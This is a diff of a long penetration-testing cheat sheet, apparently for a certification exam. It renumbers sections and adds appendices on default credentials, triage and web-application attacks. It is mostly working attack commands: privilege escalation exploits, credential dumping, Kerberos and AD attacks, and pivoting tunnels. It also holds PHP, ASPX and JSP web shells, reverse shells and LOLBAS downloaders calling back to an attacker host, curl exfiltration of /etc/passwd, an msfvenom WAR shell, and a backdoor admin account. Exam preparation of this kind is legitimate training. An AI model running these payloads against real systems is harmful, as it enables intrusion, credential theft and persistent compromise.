-msf6> use auxiliary/server/socks_proxy
-msf6> set SRVPORT 1080 ; set VERSION 5
-msf6> run -j
-# /etc/proxychains4.conf: socks5 127.0.0.1 1080
-proxychains4 nmap -sT -Pn 10.10.10.5
-```
-
 ---
 
----
+## 4. Post-Exploitation — Linux
 
-## 5. Post-Exploitation — Linux
+> 🔄 **LOOP — Shell obtained on new Linux host**: You are now at §4. After completing §4, check network: `ip a; ip r; arp -a`. New subnet found → §8 pivot setup → return to §1 recon on new segment.
 
-> 🔄 **LOOP — Shell obtained on new Linux host**: You are now at §5. After completing §5, check network: `ip a; ip r; arp -a`. New subnet found → §9 pivot setup → return to §2 recon on new segment.
-
-### 5.1 Situational Awareness
+### 4.1 Situational Awareness
 
 ```bash
 # User context & privileges
@@ -1931,7 +1299,7 @@ cat ~/.bash_history /home/*/.bash_history 2>/dev/null
 cat ~/.bashrc ~/.profile ~/.zshrc 2>/dev/null
 ```
 
-### 5.2 Privilege Escalation
+### 4.2 Privilege Escalation
 
 #### Decision tree
 
@@ -2092,7 +1460,7 @@ gcc /mnt/nfs/x.c -o /mnt/nfs/x ; sudo chmod 4755 /mnt/nfs/x
   searchsploit linux kernel <ver>
   # Compile statically when possible:
   gcc exploit.c -o exploit -static
-  # Transfer (see §10), run.
+  # Transfer (see §9), run.
   ```
 - pwnkit (CVE-2021-4034) — works on most unpatched Linux:
   ```bash
@@ -2265,9 +1633,9 @@ gcc -m32 -static cve-2021-22555.c -o exp
 > 🔄 **LOOP — Root obtained**: Re-run full enumeration as root:
 > → `id && cat /etc/shadow && cat /root/.bash_history`
 > → `find / -name "*.txt" -o -name "*.conf" -o -name "id_rsa" 2>/dev/null | head -50`
-> → Check for other users: `ls /home/` — try their creds on ALL discovered services (§4.3 spray)
-> → Check for network segmentation: `ip a; ip r; arp -a` — new CIDRs found? → Return to §2 recon on those hosts
-> → Check for AD membership: `realm list` / `cat /etc/sssd/sssd.conf` — if domain-joined → §7 AD
+> → Check for other users: `ls /home/` — try their creds on ALL discovered services (§3.3 spray)
+> → Check for network segmentation: `ip a; ip r; arp -a` — new CIDRs found? → Return to §1 recon on those hosts
+> → Check for AD membership: `realm list` / `cat /etc/sssd/sssd.conf` — if domain-joined → §6 AD
 
 #### Sudo CVEs to test
 
@@ -2300,7 +1668,7 @@ chmod +x linpeas.sh && ./linpeas.sh -a > linpeas.txt
 # Equivalents: lse.sh (less verbose), linenum.sh (stable), GTFOBlookup (scriptable)
 ```
 
-### 5.3 Credential Hunting (Linux)
+### 4.3 Credential Hunting (Linux)
 
 ```bash
 # History & SSH
@@ -2336,11 +1704,11 @@ ls /var/mail/ /var/spool/mail/ 2>/dev/null
 
 ---
 
-## 6. Post-Exploitation — Windows
+## 5. Post-Exploitation — Windows
 
-> 🔄 **LOOP — Shell obtained on new Windows host**: You are now at §6. After completing §6, check network: `ipconfig /all; arp -a`. New subnet found → §9 pivot setup → return to §2 recon on new segment.
+> 🔄 **LOOP — Shell obtained on new Windows host**: You are now at §5. After completing §5, check network: `ipconfig /all; arp -a`. New subnet found → §8 pivot setup → return to §1 recon on new segment.
 
-### 6.1 Situational Awareness
+### 5.1 Situational Awareness
 
 ```cmd
 :: User context
@@ -2412,7 +1780,7 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommuniti
 reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "DisplayName"
 ```
 
-### 6.2 Privilege Escalation
+### 5.2 Privilege Escalation
 
 #### Decision tree
 
@@ -2735,7 +2103,7 @@ powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
 .\SharpUp.exe audit
 ```
 
-### 6.3 Credential Dumping (Windows)
+### 5.3 Credential Dumping (Windows)
 
 #### Local SAM (when local admin / SYSTEM)
 
@@ -2822,14 +2190,14 @@ impacket-dpapi credential -file <cred-blob> -key <masterkey>
 > → `nxc smb <cidr> -u <user> -H <NTLM> --continue-on-success`
 > → If domain-joined: dump LSASS → look for DA/privileged domain account tickets in memory
 > → Check for sessions: `qwinsta` / BloodHound `HasSession` queries — DA logged in here?
-> → Network segmentation: `ipconfig /all` + `arp -a` — new subnets? → §9 pivot setup first
+> → Network segmentation: `ipconfig /all` + `arp -a` — new subnets? → §8 pivot setup first
 > → Add all new hashes/creds to `~/exam/creds/credentials.txt`
 
 ---
 
-## 7. Active Directory
+## 6. Active Directory
 
-### 7.1 AD Enumeration
+### 6.1 AD Enumeration
 
 #### Unauthenticated
 
@@ -2928,7 +2296,7 @@ sudo responder -I tun0 -wd
   nxc smb  <cidr>  -u <u> -p '<p>' --gen-relay-list relay.txt
   ```
 
-### 7.2 AD Attack Decision Tree
+### 6.2 AD Attack Decision Tree
 
 ```
 START
@@ -2972,31 +2340,7 @@ START
             newly discovered accounts; check certificates (certipy find).
 ```
 
-
-#### 7.2.1 Quick AD Attack Ordering Cheat-Sheet
-
-```
-1.  nxc smb <dc> -u <u> -p <p>                                  → confirm creds work
-2.  nxc smb <dc> -u <u> -p <p> --pass-pol                       → policy (lockout!)
-3.  nxc smb <dc> -u <u> -p <p> --users --groups                 → harvest users
-4.  nxc ldap <dc> -u <u> -p <p> --asreproast asrep.hash         → AS-REP roastable
-5.  nxc ldap <dc> -u <u> -p <p> --kerberoasting kerb.hash       → SPN accounts
-6.  hashcat -m 18200 asrep.hash rockyou.txt -r best64.rule      → crack AS-REP
-7.  hashcat -m 13100 kerb.hash rockyou.txt -r best64.rule       → crack TGS
-8.  bloodhound-python -d <dom> -u <u> -p <p> -ns <dc> -c All    → BloodHound
-9.  Mark current user "owned" → check "Outbound Object Control"
-10. Spray every cracked password against every host (matrix in §3.3)
-11. nxc smb <cidr> -u <u> -p <p> -M spider_plus                 → share secrets
-12. nxc ldap <dc> -u <u> -p <p> -M laps                         → LAPS read?
-13. nxc ldap <dc> -u <u> -p <p> --gmsa                          → gMSA read?
-14. certipy find -u <u>@<dom> -p <p> -dc-ip <dc> -vulnerable    → ADCS misconfigs
-15. PetitPotam / printerbug + ntlmrelayx if signing OFF / ADCS web enrollment
-16. NoPac (any user → DC) — try last as it's loud
-```
-
----
-
-### 7.3 Specific AD Attack Flows
+### 6.3 Specific AD Attack Flows
 
 #### Kerberoasting
 
@@ -3396,7 +2740,7 @@ git clone https://github.com/dirkjanm/krbrelayx
 python3 printerbug.py <dom>/<u>:'<p>'@<target> <attacker-ip>
 ```
 
-##### PetitPotam (MS-EFSRPC) — see ESC8 in §7.3 above
+##### PetitPotam (MS-EFSRPC) — see ESC8 in §6.3 above
 
 ##### MS14-068 (legacy, but useful on unpatched DCs)
 Allows any domain user → DA via crafted PAC.
@@ -3560,7 +2904,7 @@ IF SID Filtering disabled (rare on modern):
 
 ---
 
-## 8. Lateral Movement
+## 7. Lateral Movement
 
 Decision based on what you have:
 
@@ -3591,7 +2935,7 @@ Decision based on what you have:
 | Plaintext + WinRM closed | DCOM | dcomexec.py | `impacket-dcomexec <dom>/<u>:'<p>'@<ip>` |
 | MSSQL admin | Linked-server target | mssqlclient | `EXECUTE('xp_cmdshell ''whoami''') AT [LINKED]` |
 | SSH key/pass | Linux | ssh | `ssh -i k <u>@<ip>` |
-| Nothing direct | — | Pivot (§9) | — |
+| Nothing direct | — | Pivot (§8) | — |
 
 Caveats:
 - `psexec.py` — drops a service binary on `ADMIN$`. AV-trippy. SYSTEM shell, full TTY.
@@ -3615,7 +2959,7 @@ Sample krb5.conf:
 
 ---
 
-## 9. Pivoting & Tunneling
+## 8. Pivoting & Tunneling
 
 Always start by mapping: **What's my network?**
 ```bash
@@ -3625,7 +2969,7 @@ arp -a
 # What CIDRs can the foothold see that I cannot?
 ```
 
-### 9.1 Single-hop SSH forwarding
+### 8.1 Single-hop SSH forwarding
 
 - **Local port forward** — `attacker:9200 → pivot → internal:9200`:
   ```bash
@@ -3645,14 +2989,14 @@ arp -a
   proxychains4 -q impacket-psexec <dom>/<u>:'<p>'@<internal-ip>
   ```
 
-### 9.2 sshuttle (when SSH access exists, no proxychains needed)
+### 8.2 sshuttle (when SSH access exists, no proxychains needed)
 
 ```bash
 sshuttle -r user@pivot 10.10.10.0/24 --dns
 # Now your routing transparently routes 10.10.10.0/24 through pivot via SSH
 ```
 
-### 9.3 Chisel (when SSH not available — most common alt in the notes)
+### 8.3 Chisel (when SSH not available — most common alt in the notes)
 
 Attacker (server):
 ```bash
@@ -3677,7 +3021,7 @@ proxychains4 nmap -sT -Pn 10.10.10.0/24
   ./chisel client <attacker-ip>:8888 R:445:10.10.10.5:445
   ```
 
-### 9.4 Ligolo-ng (modern alternative — exam-style supplement)
+### 8.4 Ligolo-ng (modern alternative — exam-style supplement)
 
 > Note: not covered in the source notes; included because the user asked for it. The notes drill **Chisel**, **sshuttle**, **dnscat2**, **ptunnel-ng**, **rpivot**, **socat**, **plink**, **SocksOverRDP**.
 
@@ -3725,11 +3069,11 @@ sudo ip link set ligolo up
 > 🔄 **LOOP — Tunnel/Pivot established**:
 > → Discover the new network segment: `ip a; ip r; arp -a` on pivot host
 > → Add new CIDR to ligolo routing: `sudo ip route add <new-cidr>/24 dev ligolo`
-> → **Return to §2.1 Nmap from scratch on ALL new hosts** (host discovery + service scan)
-> → **Return to §2.2 service enum** for each open port on new hosts
-> → **Return to §7.1 AD enum** if DC/domain discovered on new segment
+> → **Return to §1.1 Nmap from scratch on ALL new hosts** (host discovery + service scan)
+> → **Return to §1.2 service enum** for each open port on new hosts
+> → **Return to §6.1 AD enum** if DC/domain discovered on new segment
 
-### 9.5 Multi-hop (deep network)
+### 8.5 Multi-hop (deep network)
 
 - **Ligolo-ng nested**: from agent #1, pivot to host #2, run a second `agent` connecting back to a second proxy listener on attacker.
   ```bash
@@ -3751,7 +3095,7 @@ sudo ip link set ligolo up
   ```
 - **SSH chained**: `ssh -J jump1,jump2 user@deepest`.
 
-### 9.6 Windows-only pivots
+### 8.6 Windows-only pivots
 
 - **Plink** (PuTTY's CLI ssh) for SSH from Windows pivot:
   ```cmd
@@ -3770,7 +3114,7 @@ sudo ip link set ligolo up
   Connect with mstsc → load SocksOverRDP-Plugin.dll → SOCKS exposed to attacker via virtual channel
   ```
 
-### 9.7 DNS / ICMP egress (when TCP/UDP outbound is filtered)
+### 8.7 DNS / ICMP egress (when TCP/UDP outbound is filtered)
 
 - **dnscat2** — DNS C2:
   ```bash
@@ -3788,7 +3132,7 @@ sudo ip link set ligolo up
   ssh -p 2222 user@127.0.0.1
   ```
 
-### 9.8 Metasploit pivoting
+### 8.8 Metasploit pivoting
 
 ```text
 meterpreter > run autoroute -s 10.10.10.0/24
@@ -3797,7 +3141,7 @@ msf > set SRVPORT 1080 ; set VERSION 5 ; run -j
 # proxychains then targets the meterpreter route
 ```
 
-### 9.9 Decision summary
+### 8.9 Decision summary
 
 | Constraint | Use |
 | --- | --- |
@@ -3812,9 +3156,9 @@ msf > set SRVPORT 1080 ; set VERSION 5 ; run -j
 
 ---
 
-## 10. File Transfers, Web Shells, Persistence
+## 9. File Transfers, Web Shells, Persistence
 
-### 10.1 Linux ↔ Linux
+### 9.1 Linux ↔ Linux
 
 ```bash
 # Attacker hosts
@@ -3833,7 +3177,7 @@ curl -F 'f=@/etc/passwd' http://<attacker>:9999/upload     # if updog upload ena
 scp /etc/passwd user@<attacker>:/tmp/
 ```
 
-### 10.2 Linux → Windows (download)
+### 9.2 Linux → Windows (download)
 
 ```cmd
 :: PowerShell (most common)
@@ -3851,7 +3195,7 @@ net use Z: \\<attacker>\share /user:u p
 copy Z:\nc.exe C:\Temp\nc.exe
 ```
 
-### 10.3 Windows → Linux (upload)
+### 9.3 Windows → Linux (upload)
 
 ```cmd
 :: SMB
@@ -3864,7 +3208,7 @@ certutil -encode C:\file file.b64
 type file.b64                              :: copy/paste into terminal → base64 -d
 ```
 
-### 10.4 Base64 round-trip (for tiny binaries / when stuck)
+### 9.4 Base64 round-trip (for tiny binaries / when stuck)
 
 ```bash
 # attacker
@@ -3875,7 +3219,7 @@ base64 -w0 nc > nc.b64
 [IO.File]::WriteAllBytes('C:\Temp\nc.exe',[Convert]::FromBase64String('<paste blob>'))
 ```
 
-### 10.5 LOLBAS top-5 for downloads
+### 9.5 LOLBAS top-5 for downloads
 
 | Binary | Command |
 | --- | --- |
@@ -3885,7 +3229,7 @@ base64 -w0 nc > nc.b64
 | mshta | `mshta http://<attacker>/payload.hta` |
 | regsvr32 | `regsvr32 /s /n /u /i:http://<attacker>/x.sct scrobj.dll` |
 
-### 10.6 Web shells
+### 9.6 Web shells
 
 ```php
 <?php // PHP one-liner
@@ -3916,50 +3260,7 @@ curl 'http://<host>/sh.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<lhost
 curl 'http://<host>/sh.aspx?c=powershell%20-e%20<base64-revshell>'
 ```
 
-
-#### 10.6.1 Extended Web Shell Library
-
-```php
-<?php @eval($_REQUEST['c']); ?>
-
-<?php
-if(isset($_GET['c'])) { echo "<pre>".shell_exec($_GET['c'])."</pre>"; }
-?>
-```
-
-```aspx
-<%@ Page Language="C#" %>
-<%@ Import Namespace="System.Diagnostics" %>
-<%
-    string c = Request["c"];
-    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe","/c "+c);
-    psi.RedirectStandardOutput = true;
-    psi.UseShellExecute = false;
-    Process p = Process.Start(psi);
-    Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
-%>
-```
-
-```jsp
-<%@ page import="java.util.*,java.io.*"%>
-<%
-    if (request.getParameter("c") != null) {
-        Process p = Runtime.getRuntime().exec(request.getParameter("c"));
-        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
-        String l; while((l=r.readLine())!=null) out.println(l);
-    }
-%>
-```
-
-Pre-built helpers:
-- **/usr/share/laudanum** (Kali) — PHP/ASP/JSP webshell collection.
-- **Antak** (`/usr/share/webshells/aspx/Antak.aspx`) — full ASPX webshell.
-- **WSO** (PHP webshell with file manager).
-- **p0wnyshell** (single-file PHP, terminal-emulating).
-
----
-
-### 10.7 Reverse-shell payload templates
+### 9.7 Reverse-shell payload templates
 
 ```bash
 # Linux /bin/bash
@@ -3994,32 +3295,7 @@ export TERM=xterm-256color
 stty rows 50 cols 200
 ```
 
-
-#### 10.7.1 Bind vs. Reverse Shell Decision
-
-| Network condition | Best option |
-| --- | --- |
-| Target can reach attacker (default) | Reverse shell |
-| Target is behind NAT, attacker not | Reverse shell |
-| Target has firewall blocking outbound | Bind shell (if inbound to high port allowed) |
-| Both behind NAT | Pivot first / catch via SOCKS |
-| Egress-only HTTPS / 443 | Reverse over HTTPS (meterpreter reverse_https on 443) |
-| Outbound DNS only | dnscat2 / DNS exfil |
-| Outbound ICMP only | ptunnel-ng |
-
-```bash
-# Bind shell (Linux)
-nc -lvnp 4444 -e /bin/bash                   # legacy nc, often blocked
-socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
-
-# Reverse shell catcher (Linux)
-sudo nc -lvnp 4444
-pwncat-cs -lp 4444                            # auto TTY upgrade + tools
-```
-
----
-
-### 10.8 Persistence (only if exam scope explicitly allows; otherwise note as POC)
+### 9.8 Persistence (only if exam scope explicitly allows; otherwise note as POC)
 
 Linux:
 ```bash
@@ -4044,116 +3320,13 @@ net user backup P@ssw0rd! /add
 net localgroup administrators backup /add
 ```
 
-
-### 10.9 Extended File Transfer Code Library
-
-#### 10.9.1 Updog (Python HTTP server with upload)
-
-```bash
-pipx install updog
-updog -d /tmp/share -p 9999                  # GET + POST upload UI on :9999
-```
-
-#### 10.9.2 PHP server (one-liner)
-
-```bash
-php -S 0.0.0.0:8080 -t /tmp/share
-```
-
-#### 10.9.3 Bash /dev/tcp download (no curl/wget)
-
-```bash
-exec 3<>/dev/tcp/<lh>/80
-printf 'GET /file HTTP/1.0\r\nHost: x\r\n\r\n' >&3
-cat <&3 > /tmp/file
-```
-
-#### 10.9.4 Python uploader (catch-only)
-
-```python
-python3 -c "
-from http.server import *
-class H(BaseHTTPRequestHandler):
-  def do_POST(s):
-    l=int(s.headers['Content-Length']); d=s.rfile.read(l)
-    open('out.bin','wb').write(d); s.send_response(200); s.end_headers()
-HTTPServer(('0.0.0.0',9999),H).serve_forever()"
-```
-
-#### 10.9.5 PowerShell modern download
-
-```powershell
-$wc = New-Object System.Net.WebClient
-$wc.Headers.Add('User-Agent','Mozilla/5.0')
-$wc.DownloadFile('http://<lh>/nc.exe','C:\Temp\nc.exe')
-
-# TLS-required environments
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$wc.DownloadFile('https://<lh>/nc.exe','C:\Temp\nc.exe')
-```
-
-#### 10.9.6 VBScript downloader
-
-```vbscript
-Set xHttp = CreateObject("MSXML2.ServerXMLHTTP")
-Set bStrm = CreateObject("Adodb.Stream")
-xHttp.Open "GET", "http://<lh>/nc.exe", False
-xHttp.Send
-bStrm.Type = 1 : bStrm.Open
-bStrm.Write xHttp.responseBody
-bStrm.SaveToFile "C:\Windows\Temp\nc.exe", 2
-```
-
-#### 10.9.7 JavaScript / WSH downloader
-
-```javascript
-var x = new ActiveXObject("MSXML2.XMLHTTP");
-x.open("GET","http://<lh>/nc.exe",false);
-x.send();
-var s = new ActiveXObject("ADODB.Stream");
-s.Type = 1; s.Open(); s.Write(x.responseBody);
-s.SaveToFile("C:\\Windows\\Temp\\nc.exe", 2);
-```
-Run with: `cscript //nologo //e:javascript dl.js`.
-
-#### 10.9.8 Living-off-the-Land Binaries (Windows full list)
-
-| Binary | Purpose |
-| --- | --- |
-| certutil | download + base64 |
-| bitsadmin | background download |
-| msiexec | install + execute MSI from URL |
-| mshta | execute remote HTA |
-| regsvr32 | execute remote SCT (Squiblydoo) |
-| rundll32 | execute DLL exports |
-| wmic | execute XSL via wmic |
-| installutil | execute .NET assemblies |
-| odbcconf | execute remote DLL |
-| forfiles | exec arbitrary command |
-| ftp -s:cmds.txt | scriptable FTP download |
-
-#### 10.9.9 Living-off-the-Land Binaries (Linux)
-
-```bash
-# /dev/tcp                     download (covered above)
-# wget / curl                  standard
-# python3 -m http.server       host
-# php / ruby / perl one-liners
-# busybox httpd                if curl/wget missing
-busybox httpd -p 8888 -h /tmp/share
-# scp / rsync                  if SSH available
-# nc -q 0 <h> 80 < file        netcat send
-```
-
 ---
 
----
-
-## 11. Reporting Mindset (during the exam)
+## 10. Reporting Mindset (during the exam)
 
 For every flag / finding, capture as you go:
 
-### 11.1 Per-finding evidence checklist
+### 10.1 Per-finding evidence checklist
 - [ ] **Vulnerability name** (CWE-aligned: e.g., "CWE-89 — SQL Injection in /search.php q parameter")
 - [ ] **Affected host(s)** (`10.x.x.x — hostname.domain`)
 - [ ] **Attack chain in plain English** (1-3 sentences)
@@ -4163,7 +3336,7 @@ For every flag / finding, capture as you go:
 - [ ] **Screenshot 3**: the impact (DA, root, secret data)
 - [ ] **Remediation** (1-2 sentences — don't leave blank)
 
-### 11.2 Per-host capture
+### 10.2 Per-host capture
 ```bash
 # At every shell:
 mkdir -p loot/<ip>-<host>
@@ -4174,7 +3347,7 @@ type C:\Users\*\flag*.txt 2>nul
 ```
 Save these outputs to a per-host file in your loot folder. Never lose a flag because you typed it correctly but forgot to screenshot.
 
-### 11.3 Attack chain diagram (sketch as you go)
+### 10.3 Attack chain diagram (sketch as you go)
 
 ```
 [External]      [DMZ]           [Internal]
@@ -4188,7 +3361,7 @@ Save these outputs to a per-host file in your loot folder. Never lose a flag bec
 ```
 Keep this in `report/attack-chain.md` and update after each compromise.
 
-### 11.4 Credential master file format (`creds/credentials.txt`)
+### 10.4 Credential master file format (`creds/credentials.txt`)
 
 ```text
 SOURCE                  USER                PASS/HASH                     TYPE       HOST
@@ -4198,92 +3371,9 @@ GetUserSPNs             INLANE\backupsvc    Backup1234! (cracked)         plaint
 DPAPI vault             INLANE\jdoe         P@ssw0rd!                     plaintext  10.10.10.7
 ```
 
-
-### 11.5 Documentation & Reporting (Full Structure)
-
-#### 11.5.1 Note-taking — required structure during exam
-
-```
-exam/
-├── 0-scope/
-│   ├── ROE.txt                    # Rules of Engagement (copy from email)
-│   └── targets.txt
-├── 1-recon/
-│   ├── nmap/
-│   ├── enum-<host>/
-│   └── osint/
-├── 2-foothold/
-│   ├── <host>-<service>/exploit-cmd.txt
-│   └── <host>-<service>/screenshot-1.png
-├── 3-postex/
-│   ├── creds.txt                   # the ONE master file
-│   ├── linpeas-<host>.txt
-│   └── winpeas-<host>.txt
-├── 4-pivot/
-│   └── ssh/chisel/ligolo/configs/
-├── 5-loot/
-│   └── <host>/                     # everything pulled off targets
-├── 6-flags/
-│   └── <host>-flag.txt             # one file per flag
-├── 7-screenshots/
-│   ├── 001-foothold-host1.png
-│   └── 002-priv-esc-host1.png
-└── 8-report/
-    ├── attack-chain.md
-    ├── findings/
-    │   └── <id>-<title>.md
-    └── final/
-        └── pentest-report.md
-```
-
-#### 11.5.2 Report types
-
-| Type | When | Audience |
-| --- | --- | --- |
-| **Draft Report** | Before retest/QA | Internal / client lead |
-| **Final Report** | End of engagement | All stakeholders |
-| **Attestation** | Compliance (PCI/HIPAA) | Auditors |
-| **Executive Summary** | Standalone exec brief | C-suite |
-| **Vulnerability Notification** | Critical findings during testing | Client immediately |
-
-#### 11.5.3 Standard report sections (CPTS-mandated structure)
-
-```text
-1. Title page
-2. Statement of Confidentiality
-3. Executive Summary
-   - Engagement scope
-   - Approach (black/grey/white box)
-   - Key findings (bullets, no jargon)
-   - Risk picture (heatmap or 5-bucket count)
-   - Strategic recommendations
-4. Attack Narrative / Storyline
-   - Step-by-step from foothold → DA / final objective
-   - Diagrams of network + path
-5. Findings (one per vuln)
-   - Title / Severity / CVSS
-   - Description
-   - Affected hosts/URLs
-   - Steps to Reproduce (numbered, exact commands, screenshots)
-   - Evidence
-   - Impact
-   - Remediation
-   - References
-6. Appendices
-   - Tools used
-   - List of in-scope hosts
-   - Cracked credentials (redacted in client deliverable)
-   - Scan output extracts
-   - Remediation checklist
-```
-
-#### 11.5.4 Finding write-up template
-
-```markdown
-
 ---
 
-## 12. When You're Stuck — Universal Unstuck Checklist
+## 11. When You're Stuck — Universal Unstuck Checklist
 
 Run this top to bottom every time you've spent >30 minutes without progress.
 
@@ -4306,7 +3396,7 @@ Run this top to bottom every time you've spent >30 minutes without progress.
    ```bash
    ss -tlnp        # Linux
    netstat -ano | findstr LISTENING       # Windows
-   # If 127.0.0.1:8080 is listening but firewalled — forward it (§9)
+   # If 127.0.0.1:8080 is listening but firewalled — forward it (§8)
    ```
 10. **Re-check sudo/SUID/cron after every compromise** — environments change as services restart.
 11. **Look at LinPEAS / WinPEAS RED sections you skipped** — re-read 95+ score items.
@@ -4322,7 +3412,7 @@ Run this top to bottom every time you've spent >30 minutes without progress.
 
 ---
 
-## 13. Tool Quick Reference
+## 12. Tool Quick Reference
 
 (Install assumes Kali/Parrot; commands are most-used flags.)
 
@@ -4427,9 +3517,1086 @@ Run this top to bottom every time you've spent >30 minutes without progress.
 
 ---
 
+## Appendix A — Common Service-Default-Credentials cheat-sheet
+
+| Service | Default users | Default passwords |
+| --- | --- | --- |
+| Tomcat manager | tomcat, admin, root | tomcat, admin, s3cret, password |
+| JBoss / Wildfly | admin | admin, jboss, password |
+| Jenkins | admin | admin, password |
+| GLPI | glpi | glpi |
+| RouterOS | admin | (blank) |
+| Cisco | cisco | cisco |
+| MSSQL | sa | (blank), sa, password |
+| MySQL | root | (blank), root |
+| PostgreSQL | postgres | postgres, (blank) |
+| Oracle | system, sys, scott | manager, change_on_install, tiger |
+| MongoDB | (none) | (none) – check no-auth |
+| Redis | (none) | (none) – check no-auth |
+| Memcached | (none) | (none) |
+| RabbitMQ mgmt | guest | guest |
+| Splunk | admin | changeme |
+| Grafana | admin | admin |
+| FTP anon | anonymous | anonymous, (any email) |
+| HP iLO | Administrator | (random — printed on tag) |
+| ActiveMQ | admin | admin |
+
 ---
 
-## Appendix E — Service-Port Quick Reference
+## Appendix B — One-liner Triage (run first, all parallel)
+
+```bash
+TARGET=10.10.10.10
+mkdir -p $TARGET && cd $TARGET
+
+# Full TCP + UDP top + scripts in parallel
+sudo nmap -p- --min-rate 10000 -Pn -n -oA tcp $TARGET &
+sudo nmap -sU --top-ports 100 -Pn -oA udp $TARGET &
+wait
+
+# Service scripts on found ports
+PORTS=$(grep -oP '\d+/open' tcp.gnmap | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
+sudo nmap -sV -sC -p$PORTS -Pn -oA services $TARGET
+
+# If web ports open
+for p in 80 443 8080 8443; do
+  grep -q "^$p/open" tcp.gnmap && {
+    whatweb -a3 http://$TARGET:$p &
+    feroxbuster -u http://$TARGET:$p -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50 -d 2 -o ferox-$p.txt &
+  }
+done
+wait
+
+# If 445 open
+grep -q "^445/open" tcp.gnmap && {
+  nxc smb $TARGET -u '' -p ''
+  enum4linux-ng -A $TARGET > enum4linux.txt
+}
+```
+
+---
+
+## Appendix C — Krb5 / Kerberos quick-fix
+
+When you get `KRB_AP_ERR_SKEW`:
+```bash
+sudo ntpdate <dc-ip>
+# or
+sudo timedatectl set-ntp false
+sudo date -s "$(curl -sI http://<dc-ip>/ | grep -i '^date:' | sed 's/^date: //I')"
+```
+When `KDC_ERR_S_PRINCIPAL_UNKNOWN`:
+- You used an IP instead of an FQDN — re-run with `<host>.<dom>` (case-sensitive).
+- Add `<dc-ip>  <dc-host>.<dom>  <dom>` to `/etc/hosts`.
+When `KRB5CCNAME` ignored:
+- Some tools want absolute path; use `export KRB5CCNAME=$(pwd)/foo.ccache`.
+
+---
+
+## Appendix D — Hash format quick-recognition
+
+```
+$1$...$              md5crypt (mode 500)
+$2[abxy]$...$        bcrypt (3200)
+$5$...$              sha256crypt (7400)
+$6$...$              sha512crypt (1800)
+$y$...$              yescrypt (newer Linux shadow)
+$argon2[id]$...$     argon2 (off-target for exam, mode 26500)
+^[0-9a-f]{32}$       MD5/NTLM/LM (need context)
+^[0-9a-f]{40}$       SHA1
+^[0-9a-f]{64}$       SHA256
+^aad3b435...:[0-9a-f]{32}$    LM:NT pair
+$krb5tgs$23$         Kerberoast RC4 (13100)
+$krb5tgs$17$/$18$    Kerberoast AES128/256 (19600/19700)
+$krb5asrep$23$       AS-REP roast (18200)
+$NETNTLMv2$ ::: ::: ::: ::: ::: ::    NetNTLMv2 (5600)
+```
+
+---
+
+## 13. Common Application Attacks (Detailed Decision Trees)
+
+### 13.1 WordPress
+
+#### Discovery
+- IF `wp-login.php`, `wp-content/`, `wp-` cookies visible → confirmed.
+- Version: `curl -s http://<h>/ | grep -oP 'content="WordPress \K[0-9.]+'` or wpscan.
+
+#### Enumeration
+```bash
+wpscan --url http://<h>/ --enumerate u,vp,vt,cb,dbe,m -e u1-50 \
+       --api-token <token> --random-user-agent --plugins-detection aggressive -o wpscan.txt
+# User enum (via author scan even if hidden)
+curl -s "http://<h>/?author=1" -I | grep -i location          # /author/<username>
+curl -s "http://<h>/wp-json/wp/v2/users"                       # REST API user list
+```
+
+#### Attack Decision Tree
+- IF default/weak admin creds → wp-login bruteforce:
+  ```bash
+  wpscan --url http://<h>/ --usernames admin,wordpress --passwords rockyou.txt --max-threads 20
+  hydra -L users.txt -P rockyou.txt <h> http-post-form \
+        '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' -t 10
+  ```
+- IF admin shell → edit theme:
+  ```text
+  Appearance → Theme Editor → Pick the active theme → Edit 404.php
+  Replace contents with: <?php system($_GET['c']); ?>
+  Visit: http://<h>/wp-content/themes/<theme>/404.php?c=id
+  ```
+- IF outdated plugin with known RCE → metasploit:
+  ```bash
+  msfconsole -qx "search type:exploit wordpress"
+  ```
+- High-impact CVEs to check: WP File Manager (CVE-2020-25213), WP GDPR (CVE-2018-19207), Duplicator (CVE-2020-11738), various RCE plugins.
+
+### 13.2 Joomla
+
+```bash
+curl -s http://<h>/administrator/manifests/files/joomla.xml | grep version
+curl -s http://<h>/language/en-GB/en-GB.xml | grep version
+joomscan -u http://<h>/
+droopescan scan joomla -u http://<h>/
+```
+- IF admin login → Templates → edit error.php / index.php → drop webshell.
+- CVEs: CVE-2017-8917 (SQLi unauth), CVE-2019-10945 (auth dir traversal), CVE-2023-23752 (unauth API config disclosure).
+
+### 13.3 Drupal
+
+```bash
+droopescan scan drupal -u http://<h>/
+curl -s http://<h>/CHANGELOG.txt | head
+# IF Drupal < 7.58 / 8.5.1 → Drupalgeddon2 (CVE-2018-7600)
+msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <h>; run"
+```
+- IF authenticated as admin: Modules → enable PHP filter (Drupal ≤ 7) → create page with PHP. Newer Drupal: upload backdoored module via Modules → Install.
+
+### 13.4 Tomcat
+
+```bash
+# Version
+curl -s -i http://<h>:8080/ | grep -i 'Server:'
+curl -s http://<h>:8080/docs/                    # /docs reveals version
+# Default creds — try in order
+curl -i -u tomcat:tomcat   http://<h>:8080/manager/html
+curl -i -u admin:admin     http://<h>:8080/manager/html
+curl -i -u tomcat:s3cret   http://<h>:8080/manager/html
+# Brute-force
+hydra -L users.txt -P passwords.txt <h> -s 8080 http-get /manager/html
+
+# Deploy WAR shell after creds
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lh> LPORT=4444 -f war > sh.war
+curl -u tomcat:<p> --upload-file sh.war "http://<h>:8080/manager/text/deploy?path=/sh"
+curl http://<h>:8080/sh/
+
+# Ghostcat (CVE-2020-1938) on AJP port 8009
+sudo nmap -p8009 --script ajp-* <h>
+python3 ajpShooter.py http://<h>:8080 8009 /WEB-INF/web.xml read
+
